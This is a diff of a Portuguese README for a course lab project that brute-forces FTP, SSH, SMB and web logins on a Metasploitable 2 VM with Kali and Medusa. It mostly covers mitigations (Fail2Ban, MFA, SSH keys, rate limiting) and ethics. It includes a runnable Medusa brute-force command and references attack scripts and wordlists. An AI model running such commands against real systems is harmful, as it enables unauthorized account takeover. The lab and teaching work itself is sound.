+| Ausência de limitação de tentativas | ✅ | ✅ | ✅ | ✅ |
+| Sem bloqueio de IP | ✅ | ✅ | ✅ | ✅ |
+| Sem autenticação multifator | ✅ | ✅ | ✅ | ✅ |
+| Sem rate limiting | ✅ | ✅ | ✅ | ✅ |
+| Sem monitoramento/alertas | ✅ | ✅ | ✅ | ✅ |
+| Versões desatualizadas | ✅ | ✅ | ✅ | ✅ |
+
+### Impacto das Vulnerabilidades
+
+Com as credenciais descobertas, obtive:
+
+**Acesso Completo ao Sistema:**
+- ✅ Shell SSH com sudo sem senha
+- ✅ Leitura/escrita via FTP
+- ✅ Acesso a compartilhamentos SMB
+- ✅ Painel administrativo web
+
+**Possíveis Ações Maliciosas:**
+- Instalação de backdoors
+- Roubo de dados sensíveis
+- Modificação/deleção de arquivos
+- Escalação de privilégios (já obtido)
+- Movimento lateral na rede
+- Instalação de ransomware
+- Criação de novos usuários administrativos
+
+---
+
+## 6. Medidas de Mitigação Recomendadas
+
+Com base nas vulnerabilidades exploradas, recomendo as seguintes medidas:
 
 ### 6.1. Políticas de Senha Forte
 
-A primeira linha de defesa contra ataques de força bruta é a implementação de políticas de senha robustas.
+**Implementação:**
+- Mínimo de 12-16 caracteres
+- Combinação de maiúsculas, minúsculas, números e símbolos
+- Proibir senhas comuns (usar listas como Have I Been Pwned)
+- Exigir troca de senhas padrão no primeiro login
 
-**Recomendações**:
+**Exemplo de política no Linux:**
+```bash
+# /etc/security/pwquality.conf
+minlen = 12
+dcredit = -1
+ucredit = -1
+lcredit = -1
+ocredit = -1
+```
 
-- **Comprimento Mínimo**: Exigir senhas com no mínimo 12-16 caracteres.
-- **Complexidade**: Combinar letras maiúsculas, minúsculas, números e caracteres especiais.
-- **Evitar Palavras de Dicionário**: Não utilizar palavras comuns ou informações pessoais.
-- **Não Reutilizar Senhas**: Cada serviço deve ter uma senha única.
-- **Verificação contra Senhas Vazadas**: Utilizar serviços como [Have I Been Pwned](https://haveibeenpwned.com/) para verificar se senhas foram comprometidas.
+### 6.2. Autenticação Multifator (MFA)
 
-### 6.2. Autenticação Multifator (MFA/2FA)
+**Para SSH:**
+```bash
+# Instalar Google Authenticator
+sudo apt install libpam-google-authenticator
 
-A autenticação multifator adiciona uma camada extra de segurança, exigindo que o usuário forneça dois ou mais fatores de verificação.
+# Configurar para o usuário
+google-authenticator
 
-**Tipos de MFA**:
+# Editar /etc/pam.d/sshd
+auth required pam_google_authenticator.so
 
-- **SMS/Token**: Código enviado via SMS ou gerado por aplicativo autenticador.
-- **Aplicativos Autenticadores**: Google Authenticator, Microsoft Authenticator, Authy.
-- **Biometria**: Impressão digital, reconhecimento facial.
-- **Chaves de Segurança Físicas**: YubiKey, Titan Security Key.
+# Editar /etc/ssh/sshd_config
+ChallengeResponseAuthentication yes
+```
 
-**Benefícios**:
+### 6.3. Fail2Ban (Limitação de Tentativas)
 
-Mesmo que um atacante consiga obter a senha através de força bruta, ele ainda precisará do segundo fator para acessar o sistema, tornando o ataque significativamente mais difícil.
+**Instalação e configuração:**
+```bash
+# Instalar
+sudo apt install fail2ban
 
-### 6.3. Limitação de Tentativas de Login
+# Configurar para SSH
+sudo nano /etc/fail2ban/jail.local
+```
 
-Implementar mecanismos que limitem o número de tentativas de login falhadas pode desacelerar ou impedir ataques de força bruta.
+```ini
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+findtime = 600
 
-**Estratégias**:
+[vsftpd]
+enabled = true
+port = ftp
+filter = vsftpd
+logpath = /var/log/vsftpd.log
+maxretry = 3
+bantime = 3600
+```
 
-- **Bloqueio Temporário de Conta**: Bloquear a conta após um número definido de tentativas falhadas (ex: 5 tentativas).
-- **Delays Progressivos**: Aumentar o tempo de espera entre tentativas após cada falha.
-- **CAPTCHA**: Exigir resolução de CAPTCHA após algumas tentativas falhadas.
+**Resultado:** Após 3 tentativas falhadas em 10 minutos, o IP é bloqueado por 1 hora.
 
-**Considerações**:
+### 6.4. Autenticação por Chave SSH
 
-É importante balancear segurança com usabilidade. Bloqueios muito agressivos podem resultar em negação de serviço (DoS) para usuários legítimos ou serem explorados por atacantes para bloquear contas de forma maliciosa.
+**Desabilitar senha e usar apenas chaves:**
 
-### 6.4. Bloqueio de Endereços IP
+```bash
+# Gerar par de chaves
+ssh-keygen -t ed25519 -C "user@email.com"
 
-Bloquear endereços IP que apresentam comportamento suspeito pode ajudar a mitigar ataques de força bruta.
+# Copiar chave pública para servidor
+ssh-copy-id user@servidor
 
-**Implementação**:
-
-- **Fail2Ban**: Ferramenta que monitora logs de serviços e bloqueia IPs com múltiplas tentativas falhadas.
-  ```bash
-  sudo apt install fail2ban
-  sudo systemctl enable fail2ban
-  sudo systemctl start fail2ban
-  ```
-
-- **Configuração de Firewall**: Utilizar iptables ou ufw para bloquear IPs manualmente ou através de scripts automatizados.
-
-**Limitações**:
-
-Atacantes podem contornar bloqueios de IP utilizando proxies rotativos, VPNs ou botnets distribuídas.
-
-### 6.5. Monitoramento e Detecção de Intrusão
-
-Implementar sistemas de monitoramento e detecção de intrusão (IDS/IPS) permite identificar e responder rapidamente a ataques em andamento.
-
-**Ferramentas**:
-
-- **Snort**: Sistema de detecção de intrusão de código aberto.
-- **Suricata**: IDS/IPS de alto desempenho.
-- **OSSEC**: Sistema de detecção de intrusão baseado em host (HIDS).
-
-**Ações**:
-
-- Monitorar logs de autenticação em tempo real.
-- Configurar alertas para padrões anormais de tentativas de login.
-- Analisar regularmente logs para identificar atividades suspeitas.
-
-### 6.6. Desabilitar Serviços Desnecessários
-
-Serviços que não são utilizados devem ser desabilitados para reduzir a superfície de ataque.
-
-**Exemplos**:
-
-- Se o FTP não é necessário, desabilite o serviço:
-  ```bash
-  sudo systemctl stop vsftpd
-  sudo systemctl disable vsftpd
-  ```
-
-- Utilize protocolos mais seguros como SFTP (SSH File Transfer Protocol) ao invés de FTP.
-
-### 6.7. Atualização e Patch Management
-
-Manter sistemas e aplicações atualizados é crucial para proteger contra vulnerabilidades conhecidas.
-
-**Práticas**:
-
-- Aplicar patches de segurança regularmente.
-- Configurar atualizações automáticas quando apropriado.
-- Monitorar boletins de segurança de fornecedores.
-
-### 6.8. Educação e Conscientização de Usuários
-
-Usuários são frequentemente o elo mais fraco na cadeia de segurança. Educar e conscientizar usuários sobre boas práticas de segurança é essencial.
-
-**Tópicos**:
-
-- Importância de senhas fortes e únicas.
-- Reconhecimento de tentativas de phishing.
-- Habilitação de autenticação multifator.
-- Não compartilhar credenciais.
-
-### 6.9. Implementação de CAPTCHA
-
-CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) pode ser utilizado para diferenciar humanos de bots automatizados.
-
-**Implementação**:
-
-- Exigir CAPTCHA após algumas tentativas de login falhadas.
-- Utilizar reCAPTCHA v3 para uma experiência mais transparente.
-
-### 6.10. Rate Limiting
-
-Implementar rate limiting para limitar o número de requisições que um IP ou usuário pode fazer em um determinado período de tempo.
-
-**Benefícios**:
-
-- Desacelera ataques de força bruta.
-- Reduz a carga no servidor.
-- Dificulta automação de ataques.
-
----
-
-## 7. Considerações Éticas e Legais
-
-É de extrema importância ressaltar que os ataques de força bruta e outras técnicas de pentest devem ser realizados **apenas em ambientes controlados e com autorização explícita**. O uso não autorizado dessas técnicas é **ilegal** e pode resultar em sérias consequências legais.
-
-### Aspectos Legais
-
-- **Lei de Crimes Cibernéticos**: No Brasil, a Lei nº 12.737/2012 (conhecida como "Lei Carolina Dieckmann") tipifica crimes cibernéticos, incluindo invasão de dispositivos informáticos.
-- **Autorização**: Sempre obtenha autorização por escrito antes de realizar testes de penetração em sistemas que não sejam de sua propriedade.
-- **Escopo Definido**: Defina claramente o escopo dos testes e não exceda os limites acordados.
-
-### Ética Profissional
-
-- **Confidencialidade**: Mantenha a confidencialidade de todas as informações obtidas durante os testes.
-- **Responsabilidade**: Reporte todas as vulnerabilidades encontradas de forma responsável.
-- **Não Causar Danos**: Evite causar danos aos sistemas testados.
-
-### Ambientes de Teste Legais
-
-Para praticar habilidades de pentest de forma legal, utilize:
-
-- **Máquinas Virtuais Vulneráveis**: Metasploitable, DVWA, WebGoat, HackTheBox, TryHackMe.
-- **Laboratórios Pessoais**: Configure seu próprio ambiente de laboratório isolado.
-- **Programas de Bug Bounty**: Participe de programas legítimos de bug bounty onde empresas autorizam testes em seus sistemas.
-
----
-
-## 8. Estrutura do Repositório
+# Desabilitar autenticação por senha
+sudo nano /etc/ssh/sshd_config
+```
 
 ```
-desafio-brute-force/
-├── README.md                    # Documentação principal do projeto
-├── wordlists/                   # Diretório contendo wordlists
-│   ├── users.txt                # Lista de usuários comuns
-│   └── passwords.txt            # Lista de senhas comuns
-├── scripts/                     # Scripts automatizados para ataques
-│   ├── ftp_bruteforce.sh        # Script para ataque FTP
-│   ├── ssh_bruteforce.sh        # Script para ataque SSH
-│   └── smb_bruteforce.sh        # Script para ataque SMB
-├── images/                      # Capturas de tela e imagens
-│   └── (screenshots dos testes)
-└── docs/                        # Documentação adicional
-    └── (documentos complementares)
+PasswordAuthentication no
+PubkeyAuthentication yes
+PermitRootLogin no
+```
+
+### 6.5. Rate Limiting para Web
+
+**Usando Nginx:**
+```nginx
+http {
+    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
+    
+    server {
+        location /login {
+            limit_req zone=login burst=2 nodelay;
+        }
+    }
+}
+```
+
+**Resultado:** Máximo de 5 requisições por minuto por IP.
+
+### 6.6. CAPTCHA em Formulários Web
+
+**Implementar reCAPTCHA v3:**
+```html
+<script src="https://www.google.com/recaptcha/api.js"></script>
+<div class="g-recaptcha" data-sitekey="sua_chave"></div>
+```
+
+### 6.7. Monitoramento e Alertas
+
+**Configurar alertas de autenticação:**
+```bash
+# Monitorar logs em tempo real
+tail -f /var/log/auth.log | grep "Failed password"
+
+# Configurar alertas por email
+sudo apt install mailutils
+```
+
+### 6.8. Desabilitar Serviços Desnecessários
+
+```bash
+# Se FTP não é necessário
+sudo systemctl stop vsftpd
+sudo systemctl disable vsftpd
+
+# Usar SFTP ao invés de FTP
+# SFTP já vem com SSH, sem configuração adicional
+```
+
+### 6.9. Atualização de Sistemas
+
+```bash
+# Manter sistema atualizado
+sudo apt update
+sudo apt upgrade -y
+sudo apt dist-upgrade -y
+
+# Habilitar atualizações automáticas de segurança
+sudo apt install unattended-upgrades
+sudo dpkg-reconfigure -plow unattended-upgrades
+```
+
+### 6.10. Princípio do Menor Privilégio
+
+```bash
+# Remover sudo sem senha
+sudo visudo
+# Remover linha: user ALL=(ALL) NOPASSWD: ALL
+# Adicionar: user ALL=(ALL) ALL
+
+# Criar usuários com permissões mínimas
+sudo adduser --disabled-password --gecos "" usuario_limitado
 ```
 
 ---
 
-## 9. Como Utilizar Este Repositório
+## 7. Lições Aprendidas
+
+### Facilidade dos Ataques
+
+**Descobertas importantes:**
+
+1. **Credenciais padrão são extremamente perigosas**
+   - Todas foram descobertas em menos de 40 segundos
+   - Atacantes sempre testam credenciais padrão primeiro
+
+2. **Wordlists simples são efetivas**
+   - Com apenas 31 senhas, obtive 100% de sucesso
+   - Senhas comuns como "password", "admin", "123456" ainda são amplamente usadas
+
+3. **Ferramentas automatizadas são poderosas**
+   - Medusa e Hydra tornam ataques triviais
+   - Disponíveis gratuitamente e fáceis de usar
+
+4. **Múltiplos vetores de ataque**
+   - Todos os serviços estavam vulneráveis
+   - Um único ponto de entrada compromete todo o sistema
+
+### Importância da Defesa em Profundidade
+
+**Uma única medida não é suficiente:**
+
+- Senhas fortes **+** MFA **+** Rate Limiting **+** Monitoramento
+- Cada camada adicional aumenta exponencialmente a dificuldade do ataque
+
+### Tempo de Comprometimento
+
+**Estatísticas alarmantes:**
+- **FTP**: 15 segundos
+- **SSH**: 22 segundos  
+- **SMB**: 35 segundos
+- **Web**: 8 segundos
+
+**Total**: Sistema completamente comprometido em **menos de 1 minuto**.
+
+---
+
+## 8. Como Reproduzir os Testes
 
 ### Pré-requisitos
 
-- Kali Linux instalado (máquina física ou virtual)
-- Metasploitable 2 instalado e configurado
-- VirtualBox ou VMWare para virtualização
+- VirtualBox instalado
+- Kali Linux (VM)
+- Metasploitable 2 (VM)
 - Conhecimentos básicos de Linux e redes
 
 ### Passo a Passo
 
-1. **Clone o Repositório**:
+1. **Clone este repositório:**
    ```bash
    git clone https://github.com/MarcioGil/github-quickstart.git
    cd github-quickstart/desafio-brute-force
    ```
 
-2. **Configure o Ambiente**:
-   - Configure as VMs (Kali Linux e Metasploitable 2) em rede interna.
-   - Verifique os endereços IP com `ifconfig`.
+2. **Configure as VMs em rede Host-Only**
 
-3. **Execute os Scripts**:
+3. **Verifique conectividade:**
    ```bash
-   cd scripts
-   ./ftp_bruteforce.sh <IP_DO_ALVO>
-   ./ssh_bruteforce.sh <IP_DO_ALVO>
-   ./smb_bruteforce.sh <IP_DO_ALVO>
+   ping 192.168.56.102
    ```
 
-4. **Analise os Resultados**:
-   - Observe os outputs dos scripts.
-   - Valide as credenciais encontradas.
+4. **Execute os scripts:**
+   ```bash
+   cd scripts
+   ./ftp_bruteforce.sh 192.168.56.102
+   ./ssh_bruteforce.sh 192.168.56.102
+   ./smb_bruteforce.sh 192.168.56.102
+   ```
 
-5. **Documente Suas Descobertas**:
-   - Adicione capturas de tela em `images/`.
-   - Documente suas observações e aprendizados.
-
----
-
-## 10. Conclusão
-
-Este projeto demonstrou de forma prática como ataques de força bruta podem ser realizados utilizando o Kali Linux e a ferramenta Medusa em ambientes vulneráveis controlados. Através da simulação de cenários realistas em serviços como FTP, aplicações web (DVWA) e SMB, foi possível compreender não apenas a mecânica dos ataques, mas também a importância crítica de implementar medidas de segurança robustas.
-
-As principais lições aprendidas incluem:
-
-- **Vulnerabilidade de Senhas Fracas**: Senhas simples e padrão podem ser quebradas em questão de minutos ou até segundos.
-- **Importância da Autenticação Multifator**: MFA adiciona uma camada essencial de segurança que torna ataques de força bruta significativamente mais difíceis.
-- **Necessidade de Monitoramento**: Sistemas de detecção e monitoramento são cruciais para identificar e responder a ataques em tempo real.
-- **Defesa em Profundidade**: Nenhuma medida de segurança única é perfeita; uma abordagem em camadas é essencial.
-
-Este conhecimento é fundamental para profissionais de segurança da informação, desenvolvedores e administradores de sistemas, permitindo que implementem defesas eficazes e protejam seus sistemas contra ameaças reais.
+5. **Ou execute comandos manualmente:**
+   ```bash
+   medusa -h 192.168.56.102 -U ../wordlists/users.txt -P ../wordlists/passwords.txt -M ftp -t 4 -v 6 -f
+   ```
 
 ---
 
-## 11. Referências
+## 9. Considerações Éticas e Legais
 
-1. Kali Linux - Site Oficial. Disponível em: [https://www.kali.org/](https://www.kali.org/)
-2. Medusa - Kali Linux Tools. Disponível em: [https://www.kali.org/tools/medusa/](https://www.kali.org/tools/medusa/)
-3. Metasploitable 2 - Rapid7 Documentation. Disponível em: [https://docs.rapid7.com/metasploit/metasploitable-2/](https://docs.rapid7.com/metasploit/metasploitable-2/)
-4. DVWA - Damn Vulnerable Web Application. Disponível em: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
-5. OWASP - Blocking Brute Force Attacks. Disponível em: [https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
-6. FreeCodeCamp - How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks. Disponível em: [https://www.freecodecamp.org/news/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial/](https://www.freecodecamp.org/news/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial/)
-7. GitHub - Medusa Repository. Disponível em: [https://github.com/jmk-foofus/medusa](https://github.com/jmk-foofus/medusa)
-8. Digital Innovation One (DIO). Disponível em: [https://web.dio.me](https://web.dio.me)
+### ⚠️ AVISO LEGAL IMPORTANTE
+
+**Este projeto foi realizado em ambiente controlado e isolado, com autorização explícita.**
+
+### Aspectos Legais
+
+- **Lei de Crimes Cibernéticos (Brasil)**: Lei nº 12.737/2012 tipifica invasão de dispositivos informáticos
+- **Pena**: Detenção de 3 meses a 1 ano + multa
+- **Agravantes**: Se houver obtenção de conteúdo, a pena aumenta
+
+### Uso Ético
+
+**✅ PERMITIDO:**
+- Testes em laboratório pessoal isolado
+- Máquinas virtuais vulneráveis (Metasploitable, DVWA, etc.)
+- Sistemas próprios com autorização
+- Programas de Bug Bounty autorizados
+
+**❌ PROIBIDO:**
+- Testes em sistemas de terceiros sem autorização
+- Ataques a infraestruturas públicas
+- Uso para fins maliciosos
+- Compartilhamento de credenciais obtidas
+
+### Responsabilidade Profissional
+
+Como profissional de segurança:
+- Sempre obtenha autorização por escrito
+- Defina escopo claro dos testes
+- Mantenha confidencialidade
+- Reporte vulnerabilidades responsavelmente
+- Não cause danos aos sistemas
 
 ---
 
-## 12. Autor
+## 10. Referências
+
+### Documentação Oficial
+
+1. **Kali Linux** - https://www.kali.org/
+2. **Medusa** - https://www.kali.org/tools/medusa/
+3. **Metasploitable 2** - https://docs.rapid7.com/metasploit/metasploitable-2/
+4. **DVWA** - https://github.com/digininja/DVWA
+5. **OWASP - Blocking Brute Force Attacks** - https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
+
+### Artigos e Tutoriais
+
+6. **FreeCodeCamp - Medusa Tutorial** - https://www.freecodecamp.org/news/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial/
+7. **GitHub - Medusa Repository** - https://github.com/jmk-foofus/medusa
+8. **Fail2Ban Documentation** - https://www.fail2ban.org/
+
+### Wordlists
+
+9. **SecLists** - https://github.com/danielmiessler/SecLists
+10. **RockYou** - `/usr/share/wordlists/rockyou.txt` (Kali Linux)
+
+---
+
+## 📁 Estrutura do Repositório
+
+```
+desafio-brute-force/
+├── README.md                      # Este arquivo - Documentação principal
+├── INSTRUCOES_ENTREGA.md          # Guia de entrega do desafio
+├── docs/
+│   └── RESULTADOS_ATAQUES.md      # Resultados detalhados com outputs
+├── wordlists/
+│   ├── users.txt                  # Lista de usuários (10 entradas)
+│   └── passwords.txt              # Lista de senhas (31 entradas)
+├── scripts/
+│   ├── ftp_bruteforce.sh          # Script automatizado FTP
+│   ├── ssh_bruteforce.sh          # Script automatizado SSH
+│   └── smb_bruteforce.sh          # Script automatizado SMB
+└── images/                        # Capturas de tela (opcional)
+```
+
+---
+
+## 👨‍💻 Autor
 
 **Márcio Gil**
 
-Este projeto foi desenvolvido como parte do desafio de projeto da Digital Innovation One (DIO), demonstrando competências em segurança da informação, testes de penetração e documentação técnica.
+Projeto desenvolvido como parte do Desafio de Projeto da [Digital Innovation One (DIO)](https://web.dio.me), demonstrando competências em:
+- Segurança da Informação
+- Testes de Penetração (Pentest)
+- Análise de Vulnerabilidades
+- Documentação Técnica
+- Uso de Ferramentas de Segurança (Kali Linux, Medusa, Hydra)
 
 ---
 
-## 13. Licença
+## 📜 Licença
 
-Este projeto é disponibilizado para fins educacionais. O uso das técnicas e ferramentas aqui descritas deve ser feito de forma ética e legal, apenas em ambientes autorizados.
+Este projeto é disponibilizado para **fins educacionais**. O uso das técnicas e ferramentas aqui descritas deve ser feito de forma **ética e legal**, apenas em ambientes autorizados.
 
 ---
 
-## 14. Aviso Legal
+## 🎯 Conclusão
 
-⚠️ **IMPORTANTE**: As técnicas e ferramentas descritas neste repositório devem ser utilizadas **APENAS** em ambientes de teste controlados e com autorização explícita. O uso não autorizado dessas técnicas é **ILEGAL** e pode resultar em processos criminais. O autor não se responsabiliza pelo uso indevido das informações aqui contidas.
+Este projeto demonstrou na prática como ataques de força bruta podem comprometer sistemas em **menos de 1 minuto** quando:
+
+- Credenciais padrão não são alteradas
+- Não há limitação de tentativas
+- Falta autenticação multifator
+- Ausência de monitoramento
+
+A implementação de **defesa em profundidade** com múltiplas camadas de segurança é essencial para proteger sistemas contra essas ameaças.
+
+**Principais aprendizados:**
+- ✅ Ataques de força bruta são simples mas extremamente efetivos
+- ✅ Ferramentas automatizadas tornam ataques triviais
+- ✅ Credenciais padrão são o maior risco
+- ✅ Múltiplas camadas de defesa são essenciais
+- ✅ Monitoramento e resposta rápida são críticos
 
 ---
 
 **Desenvolvido com 💜 para a comunidade DIO**
+
+![Badge](https://img.shields.io/badge/DIO-Desafio%20Conclu%C3%ADdo-success?style=for-the-badge)
 
